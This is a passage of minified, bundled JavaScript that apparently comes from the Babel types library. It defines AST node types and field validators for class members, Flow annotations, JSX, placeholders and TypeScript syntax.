X=C.assertNodeType("Identifier","StringLiteral","NumericLiteral","BigIntLiteral","PrivateName"),J=C.assertNodeType("Expression");return function(Q,Y,W){(Q.computed?J:X)(Q,Y,W)}}(),C.assertNodeType("Identifier","StringLiteral","NumericLiteral","BigIntLiteral","Expression","PrivateName"))},value:{validate:C.assertNodeType("Expression"),optional:!0},definite:{validate:C.assertValueType("boolean"),optional:!0},typeAnnotation:{validate:C.assertNodeType("TypeAnnotation","TSTypeAnnotation","Noop"),optional:!0},decorators:{validate:C.arrayOfType("Decorator"),optional:!0},readonly:{validate:C.assertValueType("boolean"),optional:!0},declare:{validate:C.assertValueType("boolean"),optional:!0},variance:{validate:C.assertNodeType("Variance"),optional:!0}})});A1("ClassPrivateProperty",{visitor:["decorators","variance","key","typeAnnotation","value"],builder:["key","value","decorators","static"],aliases:["Property","Private"],fields:{key:{validate:C.assertNodeType("PrivateName")},value:{validate:C.assertNodeType("Expression"),optional:!0},typeAnnotation:{validate:C.assertNodeType("TypeAnnotation","TSTypeAnnotation","Noop"),optional:!0},decorators:{validate:C.arrayOfType("Decorator"),optional:!0},static:{validate:C.assertValueType("boolean"),default:!1},readonly:{validate:C.assertValueType("boolean"),optional:!0},optional:{validate:C.assertValueType("boolean"),optional:!0},definite:{validate:C.assertValueType("boolean"),optional:!0},variance:{validate:C.assertNodeType("Variance"),optional:!0}}});A1("ClassPrivateMethod",{builder:["kind","key","params","body","static"],visitor:["decorators","key","typeParameters","params","returnType","body"],aliases:["Function","Scopable","BlockParent","FunctionParent","Method","Private"],fields:Object.assign({},PW(),EX(),{kind:{validate:C.assertOneOf("get","set","method"),default:"method"},key:{validate:C.assertNodeType("PrivateName")},body:{validate:C.assertNodeType("BlockStatement")}})});A1("PrivateName",{visitor:["id"],aliases:["Private"],fields:{id:{validate:C.assertNodeType("Identifier")}}});A1("StaticBlock",{visitor:["body"],fields:{body:C.validateArrayOfType("Statement")},aliases:["Scopable","BlockParent","FunctionParent"]});A1("ImportAttribute",{visitor:["key","value"],fields:{key:{validate:C.assertNodeType("Identifier","StringLiteral")},value:{validate:C.assertNodeType("StringLiteral")}}})});var vB=c(()=>{var bB=S5(),l=a8(),v1=l.defineAliasedType("Flow"),SW=(X)=>{let J=X==="DeclareClass";v1(X,{builder:["id","typeParameters","extends","body"],visitor:["id","typeParameters","extends",...J?["mixins","implements"]:[],"body"],aliases:["FlowDeclaration","Statement","Declaration"],fields:Object.assign({id:l.validateType("Identifier"),typeParameters:l.validateOptionalType("TypeParameterDeclaration"),extends:l.validateOptional(l.arrayOfType("InterfaceExtends"))},J?{mixins:l.validateOptional(l.arrayOfType("InterfaceExtends")),implements:l.validateOptional(l.arrayOfType("ClassImplements"))}:{},{body:l.validateType("ObjectTypeAnnotation")})})};v1("AnyTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});v1("ArrayTypeAnnotation",{visitor:["elementType"],aliases:["FlowType"],fields:{elementType:l.validateType("FlowType")}});v1("BooleanTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});v1("BooleanLiteralTypeAnnotation",{builder:["value"],aliases:["FlowType"],fields:{value:l.validate(l.assertValueType("boolean"))}});v1("NullLiteralTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});v1("ClassImplements",{visitor:["id","typeParameters"],fields:{id:l.validateType("Identifier"),typeParameters:l.validateOptionalType("TypeParameterInstantiation")}});SW("DeclareClass");v1("DeclareFunction",{builder:["id"],visitor:["id","predicate"],aliases:["FlowDeclaration","Statement","Declaration"],fields:{id:l.validateType("Identifier"),predicate:l.validateOptionalType("DeclaredPredicate")}});SW("DeclareInterface");v1("DeclareModule",{builder:["id","body","kind"],visitor:["id","body"],aliases:["FlowDeclaration","Statement","Declaration"],fields:{id:l.validateType("Identifier","StringLiteral"),body:l.validateType("BlockStatement"),kind:l.validateOptional(l.assertOneOf("CommonJS","ES"))}});v1("DeclareModuleExports",{visitor:["typeAnnotation"],aliases:["FlowDeclaration","Statement","Declaration"],fields:{typeAnnotation:l.validateType("TypeAnnotation")}});v1("DeclareTypeAlias",{visitor:["id","typeParameters","right"],aliases:["FlowDeclaration","Statement","Declaration"],fields:{id:l.validateType("Identifier"),typeParameters:l.validateOptionalType("TypeParameterDeclaration"),right:l.validateType("FlowType")}});v1("DeclareOpaqueType",{visitor:["id","typeParameters","supertype"],aliases:["FlowDeclaration","Statement","Declaration"],fields:{id:l.validateType("Identifier"),typeParameters:l.validateOptionalType("TypeParameterDeclaration"),supertype:l.validateOptionalType("FlowType"),impltype:l.validateOptionalType("FlowType")}});v1("DeclareVariable",{visitor:["id"],aliases:["FlowDeclaration","Statement","Declaration"],fields:{id:l.validateType("Identifier")}});v1("DeclareExportDeclaration",{visitor:["declaration","specifiers","source","attributes"],aliases:["FlowDeclaration","Statement","Declaration"],fields:Object.assign({declaration:l.validateOptionalType("Flow"),specifiers:l.validateOptional(l.arrayOfType("ExportSpecifier","ExportNamespaceSpecifier")),source:l.validateOptionalType("StringLiteral"),default:l.validateOptional(l.assertValueType("boolean"))},bB.importAttributes)});v1("DeclareExportAllDeclaration",{visitor:["source","attributes"],aliases:["FlowDeclaration","Statement","Declaration"],fields:Object.assign({source:l.validateType("StringLiteral"),exportKind:l.validateOptional(l.assertOneOf("type","value"))},bB.importAttributes)});v1("DeclaredPredicate",{visitor:["value"],aliases:["FlowPredicate"],fields:{value:l.validateType("Flow")}});v1("ExistsTypeAnnotation",{aliases:["FlowType"]});v1("FunctionTypeAnnotation",{builder:["typeParameters","params","rest","returnType"],visitor:["typeParameters","this","params","rest","returnType"],aliases:["FlowType"],fields:{typeParameters:l.validateOptionalType("TypeParameterDeclaration"),params:l.validateArrayOfType("FunctionTypeParam"),rest:l.validateOptionalType("FunctionTypeParam"),this:l.validateOptionalType("FunctionTypeParam"),returnType:l.validateType("FlowType")}});v1("FunctionTypeParam",{visitor:["name","typeAnnotation"],fields:{name:l.validateOptionalType("Identifier"),typeAnnotation:l.validateType("FlowType"),optional:l.validateOptional(l.assertValueType("boolean"))}});v1("GenericTypeAnnotation",{visitor:["id","typeParameters"],aliases:["FlowType"],fields:{id:l.validateType("Identifier","QualifiedTypeIdentifier"),typeParameters:l.validateOptionalType("TypeParameterInstantiation")}});v1("InferredPredicate",{aliases:["FlowPredicate"]});v1("InterfaceExtends",{visitor:["id","typeParameters"],fields:{id:l.validateType("Identifier","QualifiedTypeIdentifier"),typeParameters:l.validateOptionalType("TypeParameterInstantiation")}});SW("InterfaceDeclaration");v1("InterfaceTypeAnnotation",{visitor:["extends","body"],aliases:["FlowType"],fields:{extends:l.validateOptional(l.arrayOfType("InterfaceExtends")),body:l.validateType("ObjectTypeAnnotation")}});v1("IntersectionTypeAnnotation",{visitor:["types"],aliases:["FlowType"],fields:{types:l.validate(l.arrayOfType("FlowType"))}});v1("MixedTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});v1("EmptyTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});v1("NullableTypeAnnotation",{visitor:["typeAnnotation"],aliases:["FlowType"],fields:{typeAnnotation:l.validateType("FlowType")}});v1("NumberLiteralTypeAnnotation",{builder:["value"],aliases:["FlowType"],fields:{value:l.validate(l.assertValueType("number"))}});v1("NumberTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});v1("ObjectTypeAnnotation",{visitor:["properties","indexers","callProperties","internalSlots"],aliases:["FlowType"],builder:["properties","indexers","callProperties","internalSlots","exact"],fields:{properties:l.validate(l.arrayOfType("ObjectTypeProperty","ObjectTypeSpreadProperty")),indexers:{validate:l.arrayOfType("ObjectTypeIndexer"),optional:!0,default:[]},callProperties:{validate:l.arrayOfType("ObjectTypeCallProperty"),optional:!0,default:[]},internalSlots:{validate:l.arrayOfType("ObjectTypeInternalSlot"),optional:!0,default:[]},exact:{validate:l.assertValueType("boolean"),default:!1},inexact:l.validateOptional(l.assertValueType("boolean"))}});v1("ObjectTypeInternalSlot",{visitor:["id","value"],builder:["id","value","optional","static","method"],aliases:["UserWhitespacable"],fields:{id:l.validateType("Identifier"),value:l.validateType("FlowType"),optional:l.validate(l.assertValueType("boolean")),static:l.validate(l.assertValueType("boolean")),method:l.validate(l.assertValueType("boolean"))}});v1("ObjectTypeCallProperty",{visitor:["value"],aliases:["UserWhitespacable"],fields:{value:l.validateType("FlowType"),static:l.validate(l.assertValueType("boolean"))}});v1("ObjectTypeIndexer",{visitor:["variance","id","key","value"],builder:["id","key","value","variance"],aliases:["UserWhitespacable"],fields:{id:l.validateOptionalType("Identifier"),key:l.validateType("FlowType"),value:l.validateType("FlowType"),static:l.validate(l.assertValueType("boolean")),variance:l.validateOptionalType("Variance")}});v1("ObjectTypeProperty",{visitor:["key","value","variance"],aliases:["UserWhitespacable"],fields:{key:l.validateType("Identifier","StringLiteral"),value:l.validateType("FlowType"),kind:l.validate(l.assertOneOf("init","get","set")),static:l.validate(l.assertValueType("boolean")),proto:l.validate(l.assertValueType("boolean")),optional:l.validate(l.assertValueType("boolean")),variance:l.validateOptionalType("Variance"),method:l.validate(l.assertValueType("boolean"))}});v1("ObjectTypeSpreadProperty",{visitor:["argument"],aliases:["UserWhitespacable"],fields:{argument:l.validateType("FlowType")}});v1("OpaqueType",{visitor:["id","typeParameters","supertype","impltype"],aliases:["FlowDeclaration","Statement","Declaration"],fields:{id:l.validateType("Identifier"),typeParameters:l.validateOptionalType("TypeParameterDeclaration"),supertype:l.validateOptionalType("FlowType"),impltype:l.validateType("FlowType")}});v1("QualifiedTypeIdentifier",{visitor:["qualification","id"],builder:["id","qualification"],fields:{id:l.validateType("Identifier"),qualification:l.validateType("Identifier","QualifiedTypeIdentifier")}});v1("StringLiteralTypeAnnotation",{builder:["value"],aliases:["FlowType"],fields:{value:l.validate(l.assertValueType("string"))}});v1("StringTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});v1("SymbolTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});v1("ThisTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});v1("TupleTypeAnnotation",{visitor:["types"],aliases:["FlowType"],fields:{types:l.validate(l.arrayOfType("FlowType"))}});v1("TypeofTypeAnnotation",{visitor:["argument"],aliases:["FlowType"],fields:{argument:l.validateType("FlowType")}});v1("TypeAlias",{visitor:["id","typeParameters","right"],aliases:["FlowDeclaration","Statement","Declaration"],fields:{id:l.validateType("Identifier"),typeParameters:l.validateOptionalType("TypeParameterDeclaration"),right:l.validateType("FlowType")}});v1("TypeAnnotation",{visitor:["typeAnnotation"],fields:{typeAnnotation:l.validateType("FlowType")}});v1("TypeCastExpression",{visitor:["expression","typeAnnotation"],aliases:["ExpressionWrapper","Expression"],fields:{expression:l.validateType("Expression"),typeAnnotation:l.validateType("TypeAnnotation")}});v1("TypeParameter",{visitor:["bound","default","variance"],fields:{name:l.validate(l.assertValueType("string")),bound:l.validateOptionalType("TypeAnnotation"),default:l.validateOptionalType("FlowType"),variance:l.validateOptionalType("Variance")}});v1("TypeParameterDeclaration",{visitor:["params"],fields:{params:l.validate(l.arrayOfType("TypeParameter"))}});v1("TypeParameterInstantiation",{visitor:["params"],fields:{params:l.validate(l.arrayOfType("FlowType"))}});v1("UnionTypeAnnotation",{visitor:["types"],aliases:["FlowType"],fields:{types:l.validate(l.arrayOfType("FlowType"))}});v1("Variance",{builder:["kind"],fields:{kind:l.validate(l.assertOneOf("minus","plus"))}});v1("VoidTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});v1("EnumDeclaration",{aliases:["Statement","Declaration"],visitor:["id","body"],fields:{id:l.validateType("Identifier"),body:l.validateType("EnumBooleanBody","EnumNumberBody","EnumStringBody","EnumSymbolBody")}});v1("EnumBooleanBody",{aliases:["EnumBody"],visitor:["members"],fields:{explicitType:l.validate(l.assertValueType("boolean")),members:l.validateArrayOfType("EnumBooleanMember"),hasUnknownMembers:l.validate(l.assertValueType("boolean"))}});v1("EnumNumberBody",{aliases:["EnumBody"],visitor:["members"],fields:{explicitType:l.validate(l.assertValueType("boolean")),members:l.validateArrayOfType("EnumNumberMember"),hasUnknownMembers:l.validate(l.assertValueType("boolean"))}});v1("EnumStringBody",{aliases:["EnumBody"],visitor:["members"],fields:{explicitType:l.validate(l.assertValueType("boolean")),members:l.validateArrayOfType("EnumStringMember","EnumDefaultedMember"),hasUnknownMembers:l.validate(l.assertValueType("boolean"))}});v1("EnumSymbolBody",{aliases:["EnumBody"],visitor:["members"],fields:{members:l.validateArrayOfType("EnumDefaultedMember"),hasUnknownMembers:l.validate(l.assertValueType("boolean"))}});v1("EnumBooleanMember",{aliases:["EnumMember"],builder:["id"],visitor:["id","init"],fields:{id:l.validateType("Identifier"),init:l.validateType("BooleanLiteral")}});v1("EnumNumberMember",{aliases:["EnumMember"],visitor:["id","init"],fields:{id:l.validateType("Identifier"),init:l.validateType("NumericLiteral")}});v1("EnumStringMember",{aliases:["EnumMember"],visitor:["id","init"],fields:{id:l.validateType("Identifier"),init:l.validateType("StringLiteral")}});v1("EnumDefaultedMember",{aliases:["EnumMember"],visitor:["id"],fields:{id:l.validateType("Identifier")}});v1("IndexedAccessType",{visitor:["objectType","indexType"],aliases:["FlowType"],fields:{objectType:l.validateType("FlowType"),indexType:l.validateType("FlowType")}});v1("OptionalIndexedAccessType",{visitor:["objectType","indexType"],aliases:["FlowType"],fields:{objectType:l.validateType("FlowType"),indexType:l.validateType("FlowType"),optional:l.validate(l.assertValueType("boolean"))}})});var xB=c(()=>{var f0=a8(),S9=f0.defineAliasedType("JSX");S9("JSXAttribute",{visitor:["name","value"],aliases:["Immutable"],fields:{name:{validate:f0.assertNodeType("JSXIdentifier","JSXNamespacedName")},value:{optional:!0,validate:f0.assertNodeType("JSXElement","JSXFragment","StringLiteral","JSXExpressionContainer")}}});S9("JSXClosingElement",{visitor:["name"],aliases:["Immutable"],fields:{name:{validate:f0.assertNodeType("JSXIdentifier","JSXMemberExpression","JSXNamespacedName")}}});S9("JSXElement",{builder:["openingElement","closingElement","children","selfClosing"],visitor:["openingElement","children","closingElement"],aliases:["Immutable","Expression"],fields:Object.assign({openingElement:{validate:f0.assertNodeType("JSXOpeningElement")},closingElement:{optional:!0,validate:f0.assertNodeType("JSXClosingElement")},children:f0.validateArrayOfType("JSXText","JSXExpressionContainer","JSXSpreadChild","JSXElement","JSXFragment")},{selfClosing:{validate:f0.assertValueType("boolean"),optional:!0}})});S9("JSXEmptyExpression",{});S9("JSXExpressionContainer",{visitor:["expression"],aliases:["Immutable"],fields:{expression:{validate:f0.assertNodeType("Expression","JSXEmptyExpression")}}});S9("JSXSpreadChild",{visitor:["expression"],aliases:["Immutable"],fields:{expression:{validate:f0.assertNodeType("Expression")}}});S9("JSXIdentifier",{builder:["name"],fields:{name:{validate:f0.assertValueType("string")}}});S9("JSXMemberExpression",{visitor:["object","property"],fields:{object:{validate:f0.assertNodeType("JSXMemberExpression","JSXIdentifier")},property:{validate:f0.assertNodeType("JSXIdentifier")}}});S9("JSXNamespacedName",{visitor:["namespace","name"],fields:{namespace:{validate:f0.assertNodeType("JSXIdentifier")},name:{validate:f0.assertNodeType("JSXIdentifier")}}});S9("JSXOpeningElement",{builder:["name","attributes","selfClosing"],visitor:["name","typeParameters","typeArguments","attributes"],aliases:["Immutable"],fields:Object.assign({name:{validate:f0.assertNodeType("JSXIdentifier","JSXMemberExpression","JSXNamespacedName")},selfClosing:{default:!1},attributes:f0.validateArrayOfType("JSXAttribute","JSXSpreadAttribute"),typeArguments:{validate:f0.assertNodeType("TypeParameterInstantiation"),optional:!0}},{typeParameters:{validate:f0.assertNodeType("TSTypeParameterInstantiation"),optional:!0}})});S9("JSXSpreadAttribute",{visitor:["argument"],fields:{argument:{validate:f0.assertNodeType("Expression")}}});S9("JSXText",{aliases:["Immutable"],builder:["value"],fields:{value:{validate:f0.assertValueType("string")}}});S9("JSXFragment",{builder:["openingFragment","closingFragment","children"],visitor:["openingFragment","children","closingFragment"],aliases:["Immutable","Expression"],fields:{openingFragment:{validate:f0.assertNodeType("JSXOpeningFragment")},closingFragment:{validate:f0.assertNodeType("JSXClosingFragment")},children:f0.validateArrayOfType("JSXText","JSXExpressionContainer","JSXSpreadChild","JSXElement","JSXFragment")}});S9("JSXOpeningFragment",{aliases:["Immutable"]});S9("JSXClosingFragment",{aliases:["Immutable"]})});var EW=c((fB)=>{Object.defineProperty(fB,"__esModule",{value:!0});fB.PLACEHOLDERS_FLIPPED_ALIAS=fB.PLACEHOLDERS_ALIAS=fB.PLACEHOLDERS=void 0;var kp=a8(),bp=fB.PLACEHOLDERS=["Identifier","StringLiteral","Expression","Statement","Declaration","BlockStatement","ClassBody","Pattern"],_W=fB.PLACEHOLDERS_ALIAS={Declaration:["Statement"],Pattern:["PatternLike","LVal"]};for(let X of bp){let J=kp.ALIAS_KEYS[X];if(J!=null&&J.length)_W[X]=J}var TW=fB.PLACEHOLDERS_FLIPPED_ALIAS={};Object.keys(_W).forEach((X)=>{_W[X].forEach((J)=>{if(!hasOwnProperty.call(TW,J))TW[J]=[];TW[J].push(X)})})});var hB=c(()=>{var N4=a8(),fp=EW(),gp=S5(),$W=N4.defineAliasedType("Miscellaneous");$W("Noop",{visitor:[]});$W("Placeholder",{visitor:[],builder:["expectedNode","name"],fields:Object.assign({name:{validate:N4.assertNodeType("Identifier")},expectedNode:{validate:N4.assertOneOf(...fp.PLACEHOLDERS)}},gp.patternLikeCommon())});$W("V8IntrinsicIdentifier",{builder:["name"],fields:{name:{validate:N4.assertValueType("string")}}})});var yB=c(()=>{var b0=a8();b0.default("ArgumentPlaceholder",{});b0.default("BindExpression",{visitor:["object","callee"],aliases:["Expression"],fields:!process.env.BABEL_TYPES_8_BREAKING?{object:{validate:Object.assign(()=>{},{oneOfNodeTypes:["Expression"]})},callee:{validate:Object.assign(()=>{},{oneOfNodeTypes:["Expression"]})}}:{object:{validate:b0.assertNodeType("Expression")},callee:{validate:b0.assertNodeType("Expression")}}});b0.default("Decorator",{visitor:["expression"],fields:{expression:{validate:b0.assertNodeType("Expression")}}});b0.default("DoExpression",{visitor:["body"],builder:["body","async"],aliases:["Expression"],fields:{body:{validate:b0.assertNodeType("BlockStatement")},async:{validate:b0.assertValueType("boolean"),default:!1}}});b0.default("ExportDefaultSpecifier",{visitor:["exported"],aliases:["ModuleSpecifier"],fields:{exported:{validate:b0.assertNodeType("Identifier")}}});b0.default("RecordExpression",{visitor:["properties"],aliases:["Expression"],fields:{properties:b0.validateArrayOfType("ObjectProperty","SpreadElement")}});b0.default("TupleExpression",{fields:{elements:{validate:b0.arrayOfType("Expression","SpreadElement"),default:[]}},visitor:["elements"],aliases:["Expression"]});b0.default("DecimalLiteral",{builder:["value"],fields:{value:{validate:b0.assertValueType("string")}},aliases:["Expression","Pureish","Literal","Immutable"]});b0.default("ModuleExpression",{visitor:["body"],fields:{body:{validate:b0.assertNodeType("Program")}},aliases:["Expression"]});b0.default("TopicReference",{aliases:["Expression"]});b0.default("PipelineTopicExpression",{builder:["expression"],visitor:["expression"],fields:{expression:{validate:b0.assertNodeType("Expression")}},aliases:["Expression"]});b0.default("PipelineBareFunction",{builder:["callee"],visitor:["callee"],fields:{callee:{validate:b0.assertNodeType("Expression")}},aliases:["Expression"]});b0.default("PipelinePrimaryTopicReference",{aliases:["Expression"]});b0.default("VoidPattern",{aliases:["Pattern","PatternLike","FunctionParameter"]})});var rB=c(()=>{var W1=a8(),mB=S5(),hp=cJ(),p1=W1.defineAliasedType("TypeScript"),u9=W1.assertValueType("boolean"),uB=()=>({returnType:{validate:W1.assertNodeType("TSTypeAnnotation","Noop"),optional:!0},typeParameters:{validate:W1.assertNodeType("TSTypeParameterDeclaration","Noop"),optional:!0}});p1("TSParameterProperty",{aliases:["LVal"],visitor:["parameter"],fields:{accessibility:{validate:W1.assertOneOf("public","private","protected"),optional:!0},readonly:{validate:W1.assertValueType("boolean"),optional:!0},parameter:{validate:W1.assertNodeType("Identifier","AssignmentPattern")},override:{validate:W1.assertValueType("boolean"),optional:!0},decorators:{validate:W1.arrayOfType("Decorator"),optional:!0}}});p1("TSDeclareFunction",{aliases:["Statement","Declaration"],visitor:["id","typeParameters","params","returnType"],fields:Object.assign({},mB.functionDeclarationCommon(),uB())});p1("TSDeclareMethod",{visitor:["decorators","key","typeParameters","params","returnType"],fields:Object.assign({},mB.classMethodOrDeclareMethodCommon(),uB())});p1("TSQualifiedName",{aliases:["TSEntityName"],visitor:["left","right"],fields:{left:W1.validateType("TSEntityName"),right:W1.validateType("Identifier")}});var L4=()=>({typeParameters:W1.validateOptionalType("TSTypeParameterDeclaration"),["parameters"]:W1.validateArrayOfType("ArrayPattern","Identifier","ObjectPattern","RestElement"),["typeAnnotation"]:W1.validateOptionalType("TSTypeAnnotation")}),cB={aliases:["TSTypeElement"],visitor:["typeParameters","parameters","typeAnnotation"],fields:L4()};p1("TSCallSignatureDeclaration",cB);p1("TSConstructSignatureDeclaration",cB);var lB=()=>({key:W1.validateType("Expression"),computed:{default:!1},optional:W1.validateOptional(u9)});p1("TSPropertySignature",{aliases:["TSTypeElement"],visitor:["key","typeAnnotation"],fields:Object.assign({},lB(),{readonly:W1.validateOptional(u9),typeAnnotation:W1.validateOptionalType("TSTypeAnnotation"),kind:{optional:!0,validate:W1.assertOneOf("get","set")}})});p1("TSMethodSignature",{aliases:["TSTypeElement"],visitor:["key","typeParameters","parameters","typeAnnotation"],fields:Object.assign({},L4(),lB(),{kind:{validate:W1.assertOneOf("method","get","set")}})});p1("TSIndexSignature",{aliases:["TSTypeElement"],visitor:["parameters","typeAnnotation"],fields:{readonly:W1.validateOptional(u9),static:W1.validateOptional(u9),parameters:W1.validateArrayOfType("Identifier"),typeAnnotation:W1.validateOptionalType("TSTypeAnnotation")}});var yp=["TSAnyKeyword","TSBooleanKeyword","TSBigIntKeyword","TSIntrinsicKeyword","TSNeverKeyword","TSNullKeyword","TSNumberKeyword","TSObjectKeyword","TSStringKeyword","TSSymbolKeyword","TSUndefinedKeyword","TSUnknownKeyword","TSVoidKeyword"];for(let X of yp)p1(X,{aliases:["TSType","TSBaseType"],visitor:[],fields:{}});p1("TSThisType",{aliases:["TSType","TSBaseType"],visitor:[],fields:{}});var pB={aliases:["TSType"],visitor:["typeParameters","parameters","typeAnnotation"]};p1("TSFunctionType",Object.assign({},pB,{fields:L4()}));p1("TSConstructorType",Object.assign({},pB,{fields:Object.assign({},L4(),{abstract:W1.validateOptional(u9)})}));p1("TSTypeReference",{aliases:["TSType"],visitor:["typeName","typeParameters"],fields:{typeName:W1.validateType("TSEntityName"),["typeParameters"]:W1.validateOptionalType("TSTypeParameterInstantiation")}});p1("TSTypePredicate",{aliases:["TSType"],visitor:["parameterName","typeAnnotation"],builder:["parameterName","typeAnnotation","asserts"],fields:{parameterName:W1.validateType("Identifier","TSThisType"),typeAnnotation:W1.validateOptionalType("TSTypeAnnotation"),asserts:W1.validateOptional(u9)}});p1("TSTypeQuery",{aliases:["TSType"],visitor:["exprName","typeParameters"],fields:{exprName:W1.validateType("TSEntityName","TSImportType"),["typeParameters"]:W1.validateOptionalType("TSTypeParameterInstantiation")}});p1("TSTypeLiteral",{aliases:["TSType"],visitor:["members"],fields:{members:W1.validateArrayOfType("TSTypeElement")}});p1("TSArrayType",{aliases:["TSType"],visitor:["elementType"],fields:{elementType:W1.validateType("TSType")}});p1("TSTupleType",{aliases:["TSType"],visitor:["elementTypes"],fields:{elementTypes:W1.validateArrayOfType("TSType","TSNamedTupleMember")}});p1("TSOptionalType",{aliases:["TSType"],visitor:["typeAnnotation"],fields:{typeAnnotation:W1.validateType("TSType")}});p1("TSRestType",{aliases:["TSType"],visitor:["typeAnnotation"],fields:{typeAnnotation:W1.validateType("TSType")}});p1("TSNamedTupleMember",{visitor:["label","elementType"],builder:["label","elementType","optional"],fields:{label:W1.validateType("Identifier"),optional:{validate:u9,default:!1},elementType:W1.validateType("TSType")}});var dB={aliases:["TSType"],visitor:["types"],fields:{types:W1.validateArrayOfType("TSType")}};p1("TSUnionType",dB);p1("TSIntersectionType",dB);p1("TSConditionalType",{aliases:["TSType"],visitor:["checkType","extendsType","trueType","falseType"],fields:{checkType:W1.validateType("TSType"),extendsType:W1.validateType("TSType"),trueType:W1.validateType("TSType"),falseType:W1.validateType("TSType")}});p1("TSInferType",{aliases:["TSType"],visitor:["typeParameter"],fields:{typeParameter:W1.validateType("TSTypeParameter")}});p1("TSParenthesizedType",{aliases:["TSType"],visitor:["typeAnnotation"],fields:{typeAnnotation:W1.validateType("TSType")}});p1("TSTypeOperator",{aliases:["TSType"],visitor:["typeAnnotation"],builder:["typeAnnotation","operator"],fields:{operator:{validate:W1.assertValueType("string"),default:"keyof"},typeAnnotation:W1.validateType("TSType")}});p1("TSIndexedAccessType",{aliases:["TSType"],visitor:["objectType","indexType"],fields:{objectType:W1.validateType("TSType"),indexType:W1.validateType("TSType")}});p1("TSMappedType",{aliases:["TSType"],visitor:["typeParameter","nameType","typeAnnotation"],builder:["typeParameter","typeAnnotation","nameType"],fields:Object.assign({},{typeParameter:W1.validateType("TSTypeParameter")},{readonly:W1.validateOptional(W1.assertOneOf(!0,!1,"+","-")),optional:W1.validateOptional(W1.assertOneOf(!0,!1,"+","-")),typeAnnotation:W1.validateOptionalType("TSType"),nameType:W1.validateOptionalType("TSType")})});p1("TSTemplateLiteralType",{aliases:["TSType","TSBaseType"],visitor:["quasis","types"],fields:{quasis:W1.validateArrayOfType("TemplateElement"),types:{validate:W1.chain(W1.assertValueType("array"),W1.assertEach(W1.assertNodeType("TSType")),function(X,J,Q){if(X.quasis.length!==Q.length+1)throw new TypeError(`Number of ${X.type} quasis should be exactly one more than the number of types.
Expected ${Q.length+1} quasis but got ${X.quasis.length}`)})}}});p1("TSLiteralType",{aliases:["TSType","TSBaseType"],visitor:["literal"],fields:{literal:{validate:function(){let X=W1.assertNodeType("NumericLiteral","BigIntLiteral"),J=W1.assertOneOf("-"),Q=W1.assertNodeType("NumericLiteral","StringLiteral","BooleanLiteral","BigIntLiteral","TemplateLiteral");function Y(W,z,G){if(hp.default("UnaryExpression",G))J(G,"operator",G.operator),X(G,"argument",G.argument);else Q(W,z,G)}return Y.oneOfNodeTypes=["NumericLiteral","StringLiteral","BooleanLiteral","BigIntLiteral","TemplateLiteral","UnaryExpression"],Y}()}}});p1("TSExpressionWithTypeArguments",{aliases:["TSType"],visitor:["expression","typeParameters"],fields:{expression:W1.validateType("TSEntityName"),typeParameters:W1.validateOptionalType("TSTypeParameterInstantiation")}});p1("TSInterfaceDeclaration",{aliases:["Statement","Declaration"],visitor:["id","typeParameters","extends","body"],fields:{declare:W1.validateOptional(u9),id:W1.validateType("Identifier"),typeParameters:W1.validateOptionalType("TSTypeParameterDeclaration"),extends:W1.validateOptional(W1.arrayOfType("TSExpressionWithTypeArguments")),body:W1.validateType("TSInterfaceBody")}});p1("TSInterfaceBody",{visitor:["body"],fields:{body:W1.validateArrayOfType("TSTypeElement")}});p1("TSTypeAliasDeclaration",{aliases:["Statement","Declaration"],visitor:["id","typeParameters","typeAnnotation"],fields:{declare:W1.validateOptional(u9),id:W1.validateType("Identifier"),typeParameters:W1.validateOptionalType("TSTypeParameterDeclaration"),typeAnnotation:W1.validateType("TSType")}});p1("TSInstantiationExpression",{aliases:["Expression"],visitor:["expression","typeParameters"],fields:{expression:W1.validateType("Expression"),["typeParameters"]:W1.validateOptionalType("TSTypeParameterInstantiation")}});var iB={aliases:["Expression","LVal","PatternLike"],visitor:["expression","typeAnnotation"],fields:{expression:W1.validateType("Expression"),typeAnnotation:W1.validateType("TSType")}};p1("TSAsExpression",iB);p1("TSSatisfiesExpression",iB);p1("TSTypeAssertion",{aliases:["Expression","LVal","PatternLike"],visitor:["typeAnnotation","expression"],fields:{typeAnnotation:W1.validateType("TSType"),expression:W1.validateType("Expression")}});p1("TSEnumBody",{visitor:["members"],fields:{members:W1.validateArrayOfType("TSEnumMember")}});p1("TSEnumDeclaration",{aliases:["Statement","Declaration"],visitor:["id","members"],fields:{declare:W1.validateOptional(u9),const:W1.validateOptional(u9),id:W1.validateType("Identifier"),members:W1.validateArrayOfType("TSEnumMember"),initializer:W1.validateOptionalType("Expression"),body:W1.validateOptionalType("TSEnumBody")}});p1("TSEnumMember",{visitor:["id","initializer"],fields:{id:W1.validateType("Identifier","StringLiteral"),initializer:W1.validateOptionalType("Expression")}});p1("TSModuleDeclaration",{aliases:["Statement","Declaration"],visitor:["id","body"],fields:Object.assign({kind:{validate:W1.assertOneOf("global","module","namespace")},declare:W1.validateOptional(u9)},{global:W1.validateOptional(u9)},{id:W1.validateType("Identifier","StringLiteral"),body:W1.validateType("TSModuleBlock","TSModuleDeclaration")})});p1("TSModuleBlock",{aliases:["Scopable","Block","BlockParent","FunctionParent"],visitor:["body"],fields:{body:W1.validateArrayOfType("Statement")}});p1("TSImportType",{aliases:["TSType"],builder:["argument","qualifier","typeParameters"],visitor:["argument","options","qualifier","typeParameters"],fields:{argument:W1.validateType("StringLiteral"),qualifier:W1.validateOptionalType("TSEntityName"),["typeParameters"]:W1.validateOptionalType("TSTypeParameterInstantiation"),options:{validate:W1.assertNodeType("ObjectExpression"),optional:!0}}});p1("TSImportEqualsDeclaration",{aliases:["Statement","Declaration"],visitor:["id","moduleReference"],fields:Object.assign({},{isExport:W1.validate(u9)},{id:W1.validateType("Identifier"),moduleReference:W1.validateType("TSEntityName","TSExternalModuleReference"),importKind:{validate:W1.assertOneOf("type","value"),optional:!0}})});p1("TSExternalModuleReference",{visitor:["expression"],fields:{expression:W1.validateType("StringLiteral")}});p1("TSNonNullExpression",{aliases:["Expression","LVal","PatternLike"],visitor:["expression"],fields:{expressi